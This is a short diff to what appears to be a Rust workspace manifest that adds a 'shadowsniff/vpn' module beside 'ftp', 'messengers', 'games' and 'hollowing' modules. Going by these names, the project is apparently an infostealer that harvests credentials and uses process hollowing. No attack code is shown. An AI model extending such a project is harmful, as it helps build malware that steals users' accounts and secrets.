@@ -15,6 +15,7 @@ members = [
     "shadowsniff/ftp",
     "shadowsniff/messengers",
     "shadowsniff/games",
+    "shadowsniff/vpn",
     "tasks",
     "hollowing",
     "utils",
